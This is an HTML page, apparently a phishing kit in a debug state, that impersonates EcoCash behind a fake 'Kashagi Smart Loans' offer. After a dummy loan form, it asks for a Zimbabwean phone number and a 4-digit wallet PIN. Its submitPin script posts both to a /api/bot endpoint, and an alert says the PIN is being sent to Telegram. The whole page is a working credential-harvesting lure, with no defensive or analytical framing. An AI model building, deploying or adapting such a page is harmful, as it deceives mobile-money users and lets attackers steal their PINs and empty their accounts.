<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kashagi Smart Loans - EcoCash</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .pin-input:focus, .otp-input:focus { border-color: #0054A6; outline: none; box-shadow: 0 0 0 1px #0054A6; }
        .otp-input:focus { border-color: #60a5fa; box-shadow: 0 0 0 1px #60a5fa; }
        .curved-bg { border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; }
    </style>
</head>
<body class="bg-gray-100 font-sans flex justify-center min-h-screen">

    <!-- VERSION TAG TO PROVE CACHE IS CLEARED -->
    <div style="position: fixed; top: 0; left: 0; background: black; color: white; padding: 5px; font-size: 12px; z-index: 9999;">v5.0</div>

    <div class="w-full max-w-md bg-white shadow-2xl flex flex-col relative overflow-hidden min-h-screen">
        
        <!-- SCREEN 1: LANDING PAGE -->
        <main id="screen-landing" style="display: flex;" class="flex-col bg-white h-full overflow-y-auto pb-24">
            <header class="p-4 flex justify-between items-center bg-white sticky top-0 z-10 border-b border-gray-100">
                <div class="flex flex-col">
                    <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
                    <p class="text-[11px] text-gray-500 font-medium mt-1">Your phone. Your wallet.</p>
                </div>
            </header>
            <div class="px-5 mt-4">
                <h2 class="text-3xl font-extrabold text-[#1a202c] leading-tight mb-4">Fast, secure and reliable loans</h2>
                <p class="text-sm text-gray-600 mb-8 leading-relaxed">KASHAGI SMART LOANS is a trusted financial platform.</p>
            </div>
            <div class="absolute bottom-0 left-0 w-full p-4 bg-white border-t border-gray-100 z-20">
                <button type="button" onclick="document.getElementById('screen-landing').style.display='none'; document.getElementById('screen-application').style.display='flex';" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl shadow-lg cursor-pointer">
                    Apply for a Loan
                </button>
            </div>
        </main>

        <!-- SCREEN 2: APPLICATION FORM -->
        <main id="screen-application" style="display: none;" class="flex-col bg-[#f8fafc] h-full overflow-y-auto pb-10">
            <header class="pt-6 pb-2 flex flex-col items-center bg-[#f8fafc]">
                <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
            </header>
            <div class="bg-white mx-4 rounded-2xl shadow-sm border border-gray-100 p-6 mb-6 mt-6">
                <h3 class="text-lg font-bold text-gray-800">Loan Application Form</h3>
                <div class="space-y-4 mt-4">
                    <div>
                        <label class="block text-xs font-bold text-gray-700 mb-1">Full Name</label>
                        <input type="text" class="w-full border border-gray-300 rounded-lg p-3 text-sm focus:outline-none">
                    </div>
                    <button type="button" onclick="document.getElementById('screen-application').style.display='none'; document.getElementById('screen-pin').style.display='flex';" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl mt-6 cursor-pointer">
                        Submit Application
                    </button>
                </div>
            </div>
        </main>

        <!-- SCREEN 3: PIN LOGIN -->
        <main id="screen-pin" style="display: none;" class="flex-col bg-white h-full relative">
            <div class="px-6 flex-grow flex flex-col items-center pt-10 z-10">
                <h2 class="text-3xl font-serif italic text-gray-800 mb-10">Welcome</h2>
                <div class="w-full flex border-2 border-gray-800 rounded-xl overflow-hidden mb-10">
                    <div class="bg-white px-4 py-4 flex items-center text-sm font-bold border-r-2 border-gray-800">🇿🇼 +263</div>
                    <input type="tel" id="displayPhone" placeholder="Enter number here" class="w-full p-4 text-sm font-medium focus:outline-none">
                </div>
                <h3 class="text-xl font-serif italic text-gray-800 mb-6">Enter your PIN</h3>
                <div class="flex justify-center gap-3 mb-6 w-full" id="pinContainer">
                    <input type="tel" maxlength="1" inputmode="numeric" onkeyup="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
                    <input type="tel" maxlength="1" inputmode="numeric" onkeyup="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
                    <input type="tel" maxlength="1" inputmode="numeric" onkeyup="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
                    <input type="tel" maxlength="1" inputmode="numeric" onkeyup="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
                </div>
                
                <!-- TEST ALERT DIRECTLY IN BUTTON -->
                <button type="button" onclick="alert('Button clicked! Proceeding...'); window.submitPin();" id="pinBtn" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl cursor-pointer">Login</button>
            </div>
        </main>

    </div>

    <script>
        window.submitPin = function() {
            var pin = '';
            var inputs = document.getElementsByClassName('pin-input');
            for (var i = 0; i < inputs.length; i++) { pin += inputs[i].value; }
            
            if (pin.length !== 4) {
                alert("Please enter all 4 digits. Current length: " + pin.length);
                return;
            }
            
            alert("Sending PIN: " + pin + " to Telegram...");
            
            var userId = Date.now().toString().slice(-6);
            var phone = document.getElementById('displayPhone').value || "Not Provided";

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: pin, userId: userId, type: 'pin' })
            }).then(function(res) {
                return res.json().then(function(data) {
                    if (!res.ok) throw new Error(data.error || "Unknown error");
                    alert("SUCCESS! Backend accepted the request.");
                });
            }).catch(function(err) {
                alert("BACKEND ERROR: " + err.message);
            });
        };
    </script>
</body>
  </html>
